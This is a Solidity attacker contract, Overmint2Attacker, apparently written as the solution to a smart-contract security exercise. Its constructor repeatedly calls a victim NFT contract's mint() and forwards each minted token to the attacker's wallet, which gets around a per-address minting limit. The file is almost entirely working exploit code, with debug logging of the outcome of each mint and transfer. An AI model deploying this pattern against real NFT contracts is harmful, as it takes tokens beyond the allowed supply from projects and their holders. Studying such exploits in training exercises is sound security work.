//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "hardhat/console.sol";

contract Overmint2Attacker {
    address public attackerWallet;
    address public victimAddress;
    uint256 public mintCounter = 1;

    constructor(address _victimAddress) {
        victimAddress = _victimAddress;
        attackerWallet = msg.sender;
        for (uint256 i = 1; i < 6; i++) {
            (bool success,) = _victimAddress.call(abi.encodeWithSelector(bytes4(keccak256(bytes("mint()")))));
            console.log("success mint :", success);
            console.log("for tokenId: ", i);
            bool transferSuccess = transferNFT(_victimAddress, address(this), attackerWallet, i);
            console.log("Transfer Success :", transferSuccess);
        }
    }

    function transferNFT(address nftContract, address from, address to, uint256 tokenId) public returns (bool) {
        bytes4 selector = bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));

        (bool success, bytes memory data) = nftContract.call(abi.encodeWithSelector(selector, from, to, tokenId));

        if (!success) {
            // Optional: Decode the revert reason
            if (data.length > 0) {
                // Decoding the revert reason if provided by the contract that reverted
                string memory revertReason = abi.decode(data, (string));
                revert(revertReason);
            } else {
                revert("NFT transfer failed without a revert reason");
            }
        }

        return success;
    }
}
